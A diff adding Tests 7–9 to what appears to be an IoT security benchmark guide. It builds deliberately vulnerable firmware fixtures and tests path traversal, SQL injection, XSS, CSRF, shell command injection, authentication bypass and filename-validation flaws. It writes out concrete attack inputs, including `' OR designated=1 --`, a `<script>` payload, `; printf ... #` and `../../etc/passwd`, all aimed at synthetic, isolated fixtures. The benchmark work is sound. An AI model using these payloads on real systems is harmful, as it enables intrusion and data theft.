@@ -75,8 +75,8 @@ For CLI tests, run `echo "exit=$?"` **immediately after** the command you want t
 | [Test 5: Cron wildcard](#test-5) | `cwe088-cronjob-wildcard-injection` | Guest | Option-like filename selects the diagnostic; corrected control stays nominal |
 | [Test 6: Password leak](#test-6) | `cwe798-password-leak-<variant>` | Guest / extracted firmware | Recovered synthetic credential is accepted; wrong value is rejected |
 | [Test 7: REST internal files](#test-7) | `cwe022-rest-internal-files` | Guest / isolated host | Config route returns the restricted synthetic marker; control denies it |
-| [Test 8: Apache applications](#test-8) | `cwe<CWE>-apache-web` | Guest / isolated host; browser for XSS and CSRF | Selected defect produces its marker or unauthorized state change |
-| [Test 9: C path and filename](#test-9) | `cwe022-native-path-traversal`, `cwe020-native-filename-validation` | Guest / isolated host | Disallowed synthetic file is read; corrected control rejects it |
+| [Test 8: Apache applications](#test-8) | `cwe<CWE>-apache-web` | Guest / isolated host | Selected defect produces its marker or unauthorized state change |
+| [Test 9: C path and filename](#test-9) | `cwe022-native-path-traversal`, `cwe020-native-filename-validation` | Guest / isolated namespace | Disallowed synthetic file is read; outer containment or a nonmatching filename is rejected |
 | [Test 10: C buffer overflow](#test-10) | `cwe787-native-buffer-overflow` | Host / guest with ASan | ASan identifies the out-of-bounds write; corrected control rejects the input |
 | [Test 11: C connection string](#test-11) | `cwe020-native-connection-string` | Guest / host | Injected field changes SQLite from read-only to writable capability |
 | [Test 12: C symbolic links](#test-12) | `cwe061-native-symlink-following` | Guest / isolated host | Fixed file follows the synthetic symlink; corrected control denies it |
@@ -710,3 +710,616 @@ image confirms an encoded representation reaches the same native path.
 > command execution, or persistence.
 
 Source: [cwe798-password-leak](../meta-iotbench/recipes-vulns/cwe798-password-leak/).
+
+<a id="exploitable-rest-interface--internal-files-cwe-22cwe-73"></a>
+<a id="test-7"></a>
+
+## Test 7: Exploitable REST interface — internal files — CWE-22/CWE-73
+
+### Build, boot and manual testing
+
+**What this tests.** A native HTTP-style REST service reads a requested file
+under its intended `fs/api/` directory. On the vulnerable configuration route,
+the client-controlled `file` value is concatenated without enforcing that
+directory boundary, so a concrete `../restricted/marker.txt` value reads a
+real internal synthetic file. The socket and all files remain inside the guest.
+
+**Build — host:**
+
+Run from the repository root:
+
+```bash
+TEST_DEVICE=router
+TEST_SCENARIO=cwe022-rest-internal-files
+TEST_FIRMWARE="$TEST_DEVICE-$TEST_SCENARIO"
+
+FIRMWARE="$TEST_FIRMWARE" docker compose run --rm yocto
+```
+
+The selected scenario enables its required fixture build mode and opt-in through
+the existing builder. It exports the image under
+`deploy-images/router-cwe022-rest-internal-files/qemuarm64/`. Replace `router`
+with any [device keyword](#device-keywords) to build the same fixture for a
+different supported device profile.
+
+**Boot — host:**
+
+```bash
+FIRMWARE="$TEST_FIRMWARE" ./scripts/run-qemu.sh
+```
+
+At the serial console, log in as `root` with password `routeradmin`. Run all
+remaining commands in the **guest**. The service has no TCP or UDP listener:
+the REST request travels only through a guest Unix-domain socket, so do not use
+a browser or a host URL.
+
+**Manual test — guest:**
+
+1. Start the intentionally vulnerable server and confirm its private socket:
+
+   ```sh
+   REST_ROOT=/usr/share/iotbench/rest-internal-files
+   stat -c '%U:%G %a %n' "$REST_ROOT/bin/fixture-rest" "$REST_ROOT/run"
+   cat "$REST_ROOT/fs/.fixture-test-only"
+   rm -f "$REST_ROOT/run/rest.sock" /tmp/iotbench-rest-vulnerable.log
+   "$REST_ROOT/bin/fixture-rest" --isolated-fixture \
+     > /tmp/iotbench-rest-vulnerable.log 2>&1 &
+   REST_PID=$!
+   sleep 1
+   test -S "$REST_ROOT/run/rest.sock" && echo 'socket_ready=yes'
+   ```
+
+   Expected: the binary is `root:root 755`, `run` is `root:root 700`, the
+   manifest says `mode=fixture` and `enabled=1`, and `socket_ready=yes` prints.
+
+2. Send an in-bound baseline request:
+
+   ```sh
+   curl --path-as-is --unix-socket "$REST_ROOT/run/rest.sock" -sS -i \
+     'http://fixture/api/config?file=config.cfg'
+   echo "baseline_exit=$?"
+   ```
+
+   Expected: `HTTP/1.1 200 OK`, followed by
+   `device=synthetic-fixture`, `profile=lab-only`, and `baseline_exit=0`.
+
+3. Send the concrete boundary-crossing input and compare its response with the
+   installed internal file:
+
+   ```sh
+   curl --path-as-is --unix-socket "$REST_ROOT/run/rest.sock" -sS -i \
+     'http://fixture/api/config?file=%2e%2e%2frestricted%2fmarker.txt'
+   echo "traversal_exit=$?"
+   cat "$REST_ROOT/fs/restricted/marker.txt"
+   cat /tmp/iotbench-rest-vulnerable.log
+   ```
+
+   Expected: `HTTP/1.1 200 OK`,
+   `IOTBENCH_SYNTHETIC_REST_BOUNDARY_MARKER`, and `traversal_exit=0`. The
+   marker printed by `cat` must match the REST response. The log must contain
+   `fixture-read path=api/../restricted/marker.txt result=opened`, establishing
+   that the response came from the internal file rather than a fixed response.
+   Run the same `curl` command once more without changing the guest: it must
+   again return `200` and the marker.
+
+4. Replace the vulnerable process with the installed secure control and submit
+   the identical input:
+
+   ```sh
+   kill "$REST_PID"
+   wait "$REST_PID" 2>/dev/null || true
+   rm -f "$REST_ROOT/run/rest.sock"
+   "$REST_ROOT/bin/fixture-rest-secure" --isolated-fixture \
+     > /tmp/iotbench-rest-secure.log 2>&1 &
+   SECURE_PID=$!
+   sleep 1
+   curl --path-as-is --unix-socket "$REST_ROOT/run/rest.sock" -sS -i \
+     'http://fixture/api/config?file=%2e%2e%2frestricted%2fmarker.txt'
+   echo "secure_control_exit=$?"
+   cat /tmp/iotbench-rest-secure.log
+   kill "$SECURE_PID"
+   wait "$SECURE_PID" 2>/dev/null || true
+   rm -f "$REST_ROOT/run/rest.sock"
+   ```
+
+   Expected: `HTTP/1.1 403 Forbidden`, `file unavailable`, and
+   `secure_control_exit=0`. The secure log contains only its readiness line;
+   it must not report opening the restricted path. The QEMU snapshot discards
+   the two temporary log files on exit.
+
+### Scenario and scope
+
+**⚙️ Implementation.** Each of the eleven
+`<device>-cwe022-rest-internal-files` images installs only
+`cwe022-rest-internal-files` as its vulnerability package. The vulnerable
+route decodes the `file` query parameter, constructs `api/<file>`, and opens it
+read-only with `openat2` relative to the fixture's `fs/` directory. The
+intentional missing check is the `api/`-directory boundary: `api/../restricted/marker.txt`
+therefore resolves to the installed synthetic marker. The kernel confinement
+still prevents traversal outside `fs/`; no arbitrary guest or host file is
+reachable. The separate `fixture-rest-secure` binary permits only a basename.
+
+**✅ Verification.** The rebuilt `router` `qemuarm64` image was manually
+checked with the commands above: the ordinary configuration read returned 200,
+the concrete traversal returned the exact marker and an `opened` log entry, the
+same request to the secure control returned 403, and a repeated vulnerable
+request returned the same marker. These checks exercise HTTP parsing, file
+opening and response construction in the built guest binary.
+
+> ⚠️ **Disclaimer:** Intentionally insecure lab fixture; not for deployment.
+> It demonstrates a controlled **CWE-22/CWE-73** path-boundary failure, not
+> arbitrary file read, external network access, file modification, command
+> execution, remote access, or persistence.
+
+Source: [cwe022-rest-internal-files](../meta-iotbench/recipes-vulns/cwe022-rest-internal-files/).
+
+<a id="exploitable-apache-application-fixtures"></a>
+<a id="test-8"></a>
+
+## Test 8: Apache web applications — CWE-89, CWE-79, CWE-20, CWE-352, CWE-78, CWE-22, CWE-77, CWE-306, CWE-862, CWE-287
+
+### Build, boot and manual testing
+
+**What this tests.** Each image contains a real Apache CGI application with
+one selected, intentionally vulnerable web flow. The selected flow runs only
+inside a disposable user/mount/network/PID namespace on guest loopback. Apache
+does not start at boot and QEMU receives no NIC or host port-forwarding.
+
+There are ten variants for each of the eleven device profiles. Build and boot
+one variant at a time; the other nine application routes are absent from that
+image.
+
+| CWE | Firmware scenario |
+| --- | --- |
+| CWE-89 | `cwe089-apache-web` |
+| CWE-79 | `cwe079-apache-web` |
+| CWE-20 | `cwe020-apache-web` |
+| CWE-352 | `cwe352-apache-web` |
+| CWE-78 | `cwe078-apache-web` |
+| CWE-22 | `cwe022-apache-web` |
+| CWE-77 | `cwe077-apache-web` |
+| CWE-306 | `cwe306-apache-web` |
+| CWE-862 | `cwe862-apache-web` |
+| CWE-287 | `cwe287-apache-web` |
+
+**Build and boot — host:**
+
+For example, to exercise the CWE-89 router image, run from the repository
+root:
+
+```bash
+FIRMWARE=router-cwe089-apache-web docker compose run --rm yocto
+FIRMWARE=router-cwe089-apache-web ./scripts/run-qemu.sh
+```
+
+Replace only `router-cwe089-apache-web` with one literal firmware ID from the
+table above, using any supported device keyword. Wait for `login:` and sign in
+as `root` with password `routeradmin`. All remaining commands run in the guest
+serial console. Do not use a host URL: this image has no guest network device.
+
+**Start the selected fixture — guest:**
+
+```sh
+rm -f /tmp/iotbench-apache.log
+su -s /bin/sh -c 'cd /usr/share/iotbench/apache-fixture && ./manual-launch.sh --isolated-fixture > /tmp/iotbench-apache.log 2>&1 &' iotapache
+until grep -q '^manual-apache-ready' /tmp/iotbench-apache.log; do sleep 1; done
+cat /tmp/iotbench-apache.log
+FIXTURE_PID=$(sed -n 's/^manual-launch-pid=//p' /tmp/iotbench-apache.log | tail -n 1)
+```
+
+Expected: `manual-apache-ready variant=CWE-... uid=1000`. The launcher only
+stages fixed package files and starts Apache; it sends no HTTP request and makes
+no assertion. `FIXTURE_PID` identifies its private network namespace.
+
+The following login establishes a disposable admin session for CWE-89, CWE-79,
+CWE-20, CWE-352, CWE-78, CWE-22 and CWE-77. It is not needed for CWE-306, and
+CWE-862 and CWE-287 have their own commands below.
+
+```sh
+nsenter -t "$FIXTURE_PID" -n -- curl -sS --max-time 5 \
+  -D /tmp/apache-login.headers -o /tmp/apache-login.json \
+  -X POST -H 'Origin: http://127.0.0.1:18080' \
+  --data-urlencode 'identity=admin' \
+  --data-urlencode 'proof=fixture-admin-proof' \
+  http://127.0.0.1:18080/app/login
+SESSION=$(sed -n 's/^Set-Cookie: fixture_session=\([^;]*\).*/fixture_session=\1/p' /tmp/apache-login.headers | tr -d '\r')
+CSRF=$(sed -n 's/.*"csrf": "\([^"]*\)".*/\1/p' /tmp/apache-login.json)
+sed -n '1p' /tmp/apache-login.headers
+cat /tmp/apache-login.json
+```
+
+Expected: HTTP 200, an `identity` of `admin`, and nonempty `SESSION` and `CSRF`
+values. They are random per launcher invocation.
+
+**Manual cases — guest:**
+
+Run the two commands for the image selected at build time. The first is the
+ordinary baseline where useful; the second is the concrete input that reaches
+the intended condition.
+
+**CWE-89 — SQL query construction.**
+
+```sh
+nsenter -t "$FIXTURE_PID" -n -- curl -sS --max-time 5 --get \
+  --cookie "$SESSION" --data-urlencode 'name=public' \
+  http://127.0.0.1:18080/app/query
+nsenter -t "$FIXTURE_PID" -n -- curl -sS --max-time 5 --get \
+  --cookie "$SESSION" --data-urlencode "name=' OR designated=1 --" \
+  http://127.0.0.1:18080/app/query
+```
+
+Expected: the baseline returns `synthetic-public-record`; the second response
+returns `synthetic-sql-sentinel`. The database is read-only, so this is a
+bounded query-result witness rather than a database modification.
+
+**CWE-79 — reflected HTML.**
+
+```sh
+nsenter -t "$FIXTURE_PID" -n -- curl -sS --max-time 5 --get \
+  --cookie "$SESSION" --data-urlencode 'message=ordinary' \
+  http://127.0.0.1:18080/app/reflect
+nsenter -t "$FIXTURE_PID" -n -- curl -sS --max-time 5 --get \
+  --cookie "$SESSION" \
+  --data-urlencode 'message=<script>document.body.dataset.fixture="xss-marker"</script>' \
+  http://127.0.0.1:18080/app/reflect
+```
+
+Expected: the first response contains `<main>ordinary</main>`; the second
+contains the literal unencoded `<script>` element inside `main`. The terminal
+test observes the missing output encoding; it deliberately does not execute a
+browser payload.
+
+**CWE-20 — missing numeric upper bound.**
+
+```sh
+nsenter -t "$FIXTURE_PID" -n -- curl -sS --max-time 5 -X POST \
+  -H 'Origin: http://127.0.0.1:18080' --cookie "$SESSION" \
+  --data-urlencode "csrf=$CSRF" --data-urlencode 'level=100' \
+  http://127.0.0.1:18080/app/level
+nsenter -t "$FIXTURE_PID" -n -- curl -sS --max-time 5 -X POST \
+  -H 'Origin: http://127.0.0.1:18080' --cookie "$SESSION" \
+  --data-urlencode "csrf=$CSRF" --data-urlencode 'level=101' \
+  http://127.0.0.1:18080/app/level
+```
+
+Expected: the first response reports `"level": 100` and
+the second reports `"level": 101`, although the fixture contract is 0 through
+100 inclusive.
+
+**CWE-352 — missing CSRF decision.**
+
+```sh
+nsenter -t "$FIXTURE_PID" -n -- curl -sS --max-time 5 -X POST \
+  -H 'Origin: http://127.0.0.1:18080' --cookie "$SESSION" \
+  --data-urlencode 'value=ordinary' \
+  http://127.0.0.1:18080/app/setting
+nsenter -t "$FIXTURE_PID" -n -- curl -sS --max-time 5 -X POST \
+  -H 'Origin: http://127.0.0.1:18081' --cookie "$SESSION" \
+  --data-urlencode 'value=csrf-marker' \
+  http://127.0.0.1:18080/app/setting
+```
+
+Expected: the first response contains `"value": "ordinary"`. The second has
+the local second-origin header and no CSRF token, but still returns
+`"value": "csrf-marker"`.
+
+**CWE-78 — shell command construction.**
+
+```sh
+HTTPD_PID=$(pidof httpd | awk '{print $1}')
+nsenter -t "$HTTPD_PID" -m -- /usr/bin/cat /state/shell.marker 2>/dev/null || echo 'shell-marker=absent'
+nsenter -t "$FIXTURE_PID" -n -- curl -sS --max-time 5 -X POST \
+  -H 'Origin: http://127.0.0.1:18080' --cookie "$SESSION" \
+  --data-urlencode "csrf=$CSRF" --data-urlencode 'label=ordinary' \
+  http://127.0.0.1:18080/app/diagnostic
+nsenter -t "$FIXTURE_PID" -n -- curl -sS --max-time 5 -X POST \
+  -H 'Origin: http://127.0.0.1:18080' --cookie "$SESSION" \
+  --data-urlencode "csrf=$CSRF" \
+  --data-urlencode 'label=ordinary; printf shell-marker > shell.marker; #' \
+  http://127.0.0.1:18080/app/diagnostic
+nsenter -t "$HTTPD_PID" -m -- /usr/bin/cat /state/shell.marker
+```
+
+Expected: both requests report `"ran": true`; the final command prints
+`shell-marker`. The file is a tmpfs marker inside the private fixture mount,
+not a guest or host file.
+
+**CWE-22 — allowed-directory escape.**
+
+```sh
+nsenter -t "$FIXTURE_PID" -n -- curl -sS --max-time 5 --get \
+  --cookie "$SESSION" --data-urlencode 'file=public.txt' \
+  http://127.0.0.1:18080/app/file
+nsenter -t "$FIXTURE_PID" -n -- curl -sS --max-time 5 --get \
+  --cookie "$SESSION" --data-urlencode 'file=../sentinel.txt' \
+  http://127.0.0.1:18080/app/file
+```
+
+Expected: the baseline returns `synthetic-public`; the second response returns
+`synthetic-traversal-sentinel`, which exists only in the fixture state tree.
+
+**CWE-77 — application command interpreter.**
+
+```sh
+HTTPD_PID=$(pidof httpd | awk '{print $1}')
+nsenter -t "$HTTPD_PID" -m -- /usr/bin/cat /state/interpreter.marker 2>/dev/null || echo 'interpreter-marker=absent'
+nsenter -t "$FIXTURE_PID" -n -- curl -sS --max-time 5 -X POST \
+  -H 'Origin: http://127.0.0.1:18080' --cookie "$SESSION" \
+  --data-urlencode "csrf=$CSRF" --data-urlencode 'label=ordinary' \
+  http://127.0.0.1:18080/app/command
+nsenter -t "$FIXTURE_PID" -n -- curl -sS --max-time 5 -X POST \
+  -H 'Origin: http://127.0.0.1:18080' --cookie "$SESSION" \
+  --data-urlencode "csrf=$CSRF" --data-urlencode 'label=ordinary; MARK' \
+  http://127.0.0.1:18080/app/command
+nsenter -t "$HTTPD_PID" -m -- /usr/bin/cat /state/interpreter.marker
+```
+
+Expected: the first response shows `ordinary`; the second prints
+`application-command-marker`. This variant invokes only the synthetic
+application grammar, not an operating-system shell.
+
+**CWE-306 — critical write without authentication.**
+
+```sh
+nsenter -t "$FIXTURE_PID" -n -- curl -sS --max-time 5 -X POST \
+  --data-urlencode 'value=ordinary' \
+  http://127.0.0.1:18080/app/critical
+nsenter -t "$FIXTURE_PID" -n -- curl -sS --max-time 5 -X POST \
+  --data-urlencode 'value=unauthenticated-marker' \
+  http://127.0.0.1:18080/app/critical
+```
+
+Expected: the first response contains `"value": "ordinary"`; the second
+contains `"value": "unauthenticated-marker"`, without any cookie or login.
+
+**CWE-862 — authenticated reader changes an admin setting.**
+
+```sh
+nsenter -t "$FIXTURE_PID" -n -- curl -sS --max-time 5 -o /dev/null -w '%{http_code}\n' \
+  -X POST --data-urlencode 'csrf=arbitrary' --data-urlencode 'value=ordinary' \
+  http://127.0.0.1:18080/app/admin-setting
+nsenter -t "$FIXTURE_PID" -n -- curl -sS --max-time 5 \
+  -D /tmp/apache-reader.headers -o /tmp/apache-reader.json \
+  -X POST -H 'Origin: http://127.0.0.1:18080' \
+  --data-urlencode 'identity=reader' \
+  --data-urlencode 'proof=fixture-reader-proof' \
+  http://127.0.0.1:18080/app/login
+READER_SESSION=$(sed -n 's/^Set-Cookie: fixture_session=\([^;]*\).*/fixture_session=\1/p' /tmp/apache-reader.headers | tr -d '\r')
+READER_CSRF=$(sed -n 's/.*"csrf": "\([^"]*\)".*/\1/p' /tmp/apache-reader.json)
+nsenter -t "$FIXTURE_PID" -n -- curl -sS --max-time 5 -X POST \
+  -H 'Origin: http://127.0.0.1:18080' --cookie "$READER_SESSION" \
+  --data-urlencode "csrf=$READER_CSRF" --data-urlencode 'value=reader-marker' \
+  http://127.0.0.1:18080/app/admin-setting
+```
+
+Expected: the first command prints `401`; the reader login succeeds; the final
+response returns `"value": "reader-marker"` even though the session role is
+not admin.
+
+**CWE-287 — truncated proof comparison.**
+
+```sh
+nsenter -t "$FIXTURE_PID" -n -- curl -sS --max-time 5 -o /dev/null -w '%{http_code}\n' \
+  -X POST -H 'Origin: http://127.0.0.1:18080' \
+  --data-urlencode 'identity=admin' --data-urlencode 'proof=wrong' \
+  http://127.0.0.1:18080/app/login
+nsenter -t "$FIXTURE_PID" -n -- curl -sS --max-time 5 \
+  -D /tmp/apache-forged.headers -o /tmp/apache-forged.json -w '%{http_code}\n' \
+  -X POST -H 'Origin: http://127.0.0.1:18080' \
+  --data-urlencode 'identity=admin' --data-urlencode 'proof=fixture-INVALID' \
+  http://127.0.0.1:18080/app/login
+FORGED_SESSION=$(sed -n 's/^Set-Cookie: fixture_session=\([^;]*\).*/fixture_session=\1/p' /tmp/apache-forged.headers | tr -d '\r')
+nsenter -t "$FIXTURE_PID" -n -- curl -sS --max-time 5 --get \
+  --cookie "$FORGED_SESSION" http://127.0.0.1:18080/app/identity
+```
+
+Expected: the baseline prints `401`; the second login prints `200` and the final
+response is `{"accepted_identity": "admin"}`. The supplied proof only
+shares the first eight characters with the synthetic admin proof.
+
+Stop the fixture before booting another variant:
+
+```sh
+kill "$FIXTURE_PID"
+wait "$FIXTURE_PID" 2>/dev/null || true
+```
+
+The volatile staging directory and all sessions, databases and marker files are
+removed when the fixture exits; a QEMU snapshot discards the outer guest files.
+
+### Scenario and scope
+
+**⚙️ Implementation.** Every `<device>-cweNNN-apache-web` image selects exactly
+one `scenario.py` from `apache-web-fixture`; image guards reject a second
+fixture package. `manual-launch.sh` reuses the package's namespace launcher,
+starts Apache as UID 1000 with private loopback only, and provides fixed
+synthetic SQLite/filesystem state. The `curl` commands above are the only HTTP
+inputs: no host service, external address, production credential, persistence
+or post-exploitation path is involved.
+
+**✅ Runtime evidence.** All ten rebuilt `router` `qemuarm64` variants were
+manually exercised through their guest serial consoles with the commands above.
+The observed witnesses were, respectively: SQL sentinel (89), literal script
+reflection (79), level `101` (20), `csrf-marker` from port 18081 (352),
+`shell-marker` (78), traversal sentinel (22),
+`application-command-marker` (77), unauthenticated marker (306), reader
+marker after a 401 unauthenticated baseline (862), and an accepted `admin`
+identity after the truncated-proof login (287). Each run used QEMU without a
+NIC and a new disposable fixture state.
+
+> ⚠️ **Disclaimer:** Intentionally insecure, isolated benchmark fixtures only.
+> Apache listens solely on the fixture's private loopback interface; QEMU has no
+> NIC for these images. Do not deploy this configuration or reuse its synthetic
+> inputs outside this benchmark.
+
+Source: [apache-web-fixture](../meta-iotbench/recipes-vulns/apache-web-fixture/).
+
+<a id="vulnerable-c-binaries--path-traversal-and-filename-validation-cwe-22cwe-20"></a>
+<a id="test-9"></a>
+
+## Test 9: Vulnerable C binaries — path traversal and filename validation — CWE-22/CWE-20
+
+### Build, boot and manual testing
+
+**What this tests.** These images run the actual AArch64 C binary in a fresh,
+unprivileged mount namespace. Each request copies the installed fixture into
+that namespace, so the observed marker can only come from its synthetic
+filesystem. The commands below are manual terminal commands; they do not use a
+client script or Python.
+
+**CWE-22 build and boot — host:**
+
+```bash
+TEST_DEVICE=router
+TEST_SCENARIO=cwe022-native-path-traversal
+TEST_FIRMWARE="${TEST_DEVICE}-${TEST_SCENARIO}"
+
+FIRMWARE="$TEST_FIRMWARE" docker compose run --rm yocto
+FIRMWARE="$TEST_FIRMWARE" ./scripts/run-qemu.sh
+```
+
+Log in on the serial console as `root` (password `routeradmin`). The named
+scenario enables its fixture configuration automatically.
+
+**CWE-22 baseline — guest:**
+
+```sh
+su -s /bin/sh iotpath -c '
+root=$(mktemp -d /tmp/iotbench-path.XXXXXX) || exit 1
+/usr/share/iotbench/native-path/bin/isolate-path --manual-request /usr/share/iotbench/native-path "$root" public.cfg
+status=$?
+rmdir "$root"
+exit "$status"
+'
+echo "baseline_exit=$?"
+```
+
+Expected: `OK 32`, followed by `SYNTHETIC_ALLOWED_CONFIGURATION`, and
+`baseline_exit=0`.
+
+**CWE-22 traversal, containment control, and repeat — guest:**
+
+```sh
+cat /usr/share/iotbench/native-path/fs/sentinel.txt
+su -s /bin/sh iotpath -c '
+root=$(mktemp -d /tmp/iotbench-path.XXXXXX) || exit 1
+/usr/share/iotbench/native-path/bin/isolate-path --manual-request /usr/share/iotbench/native-path "$root" ../sentinel.txt
+status=$?
+rmdir "$root"
+exit "$status"
+'
+echo "traversal_exit=$?"
+
+su -s /bin/sh iotpath -c '
+root=$(mktemp -d /tmp/iotbench-path.XXXXXX) || exit 1
+/usr/share/iotbench/native-path/bin/isolate-path --manual-request /usr/share/iotbench/native-path "$root" ../../etc/passwd
+status=$?
+rmdir "$root"
+exit "$status"
+'
+echo "containment_exit=$?"
+
+su -s /bin/sh iotpath -c '
+root=$(mktemp -d /tmp/iotbench-path.XXXXXX) || exit 1
+/usr/share/iotbench/native-path/bin/isolate-path --manual-request /usr/share/iotbench/native-path "$root" ../sentinel.txt
+status=$?
+rmdir "$root"
+exit "$status"
+'
+echo "repeat_exit=$?"
+```
+
+Expected: the first command prints `SYNTHETIC_CWE22_SENTINEL_ONLY`. Both
+`../sentinel.txt` requests return `OK 30` and that same marker with exit `0`:
+the C code prefixes the input with `allowed/`, so `..` escapes only the
+synthetic `allowed` directory. The `../../etc/passwd` control returns
+`ERR DENIED` (and `containment_exit=0`, because the fixture handled the denied
+request); it cannot leave the outer synthetic `/fixture/fs` root.
+
+Shut down the guest (`poweroff`) before booting the second image.
+
+**CWE-20 build and boot — host:**
+
+```bash
+TEST_DEVICE=router
+TEST_SCENARIO=cwe020-native-filename-validation
+TEST_FIRMWARE="${TEST_DEVICE}-${TEST_SCENARIO}"
+
+FIRMWARE="$TEST_FIRMWARE" docker compose run --rm yocto
+FIRMWARE="$TEST_FIRMWARE" ./scripts/run-qemu.sh
+```
+
+Log in again as `root` with password `routeradmin`.
+
+**CWE-20 baseline, rejected control, bypass, and repeat — guest:**
+
+```sh
+cat /usr/share/iotbench/native-path/fs/allowed/private.cfg.bak
+
+su -s /bin/sh iotpath -c '
+root=$(mktemp -d /tmp/iotbench-path.XXXXXX) || exit 1
+/usr/share/iotbench/native-path/bin/isolate-path --manual-request /usr/share/iotbench/native-path "$root" public.cfg
+status=$?
+rmdir "$root"
+exit "$status"
+'
+echo "baseline_exit=$?"
+
+su -s /bin/sh iotpath -c '
+root=$(mktemp -d /tmp/iotbench-path.XXXXXX) || exit 1
+/usr/share/iotbench/native-path/bin/isolate-path --manual-request /usr/share/iotbench/native-path "$root" private.bak
+status=$?
+rmdir "$root"
+exit "$status"
+'
+echo "rejected_control_exit=$?"
+
+su -s /bin/sh iotpath -c '
+root=$(mktemp -d /tmp/iotbench-path.XXXXXX) || exit 1
+/usr/share/iotbench/native-path/bin/isolate-path --manual-request /usr/share/iotbench/native-path "$root" private.cfg.bak
+status=$?
+rmdir "$root"
+exit "$status"
+'
+echo "filename_bypass_exit=$?"
+
+su -s /bin/sh iotpath -c '
+root=$(mktemp -d /tmp/iotbench-path.XXXXXX) || exit 1
+/usr/share/iotbench/native-path/bin/isolate-path --manual-request /usr/share/iotbench/native-path "$root" private.cfg.bak
+status=$?
+rmdir "$root"
+exit "$status"
+'
+echo "repeat_exit=$?"
+```
+
+Expected: the initial `cat` prints `SYNTHETIC_CWE20_DISALLOWED_BACKUP`.
+`public.cfg` returns `OK 32` and `SYNTHETIC_ALLOWED_CONFIGURATION`;
+`private.bak` returns `ERR DENIED` with `rejected_control_exit=0`. Both
+`private.cfg.bak` requests return `OK 34` and
+`SYNTHETIC_CWE20_DISALLOWED_BACKUP` with exit `0`. The C
+filename check accepts the `.cfg` prefix but does not require it to be the
+end of the name, so it reads the otherwise disallowed synthetic backup.
+
+### Scenario and scope
+
+**⚙️ Implementation.** The same two thin image recipes exist for every listed
+device category. The manual entry invokes the installed `isolate-path` and the
+same `retrieve()` sink used by the package; it makes no listener, host mount,
+or network request. The normal fixture ELF is static PIE so it remains
+executable after the launcher pivots into its temporary root.
+
+**✅ Runtime evidence.** On `router`/`qemuarm64`, both final exports were built
+with the normal Compose workflow and manually exercised through QEMU's serial
+console. CWE-22 produced the allowed baseline, the synthetic sentinel through
+`../sentinel.txt`, an `ERR DENIED` outer-boundary control, and the same sentinel
+on repetition. CWE-20 produced its allowed baseline, rejected `private.bak`,
+read the synthetic backup through `private.cfg.bak`, and repeated that result.
+The runtime evidence is limited to this built router/QEMU variant; the shared
+recipes provide the corresponding fixture for the other device categories.
+
+> ⚠️ **Disclaimer:** Intentionally insecure, isolated benchmark fixtures only.
+> The requested files are synthetic and copied into a disposable namespace; do
+> not deploy these inputs or configurations outside this benchmark.
+
+Source: [native-path-fixture](../meta-iotbench/recipes-vulns/native-path-fixture/).
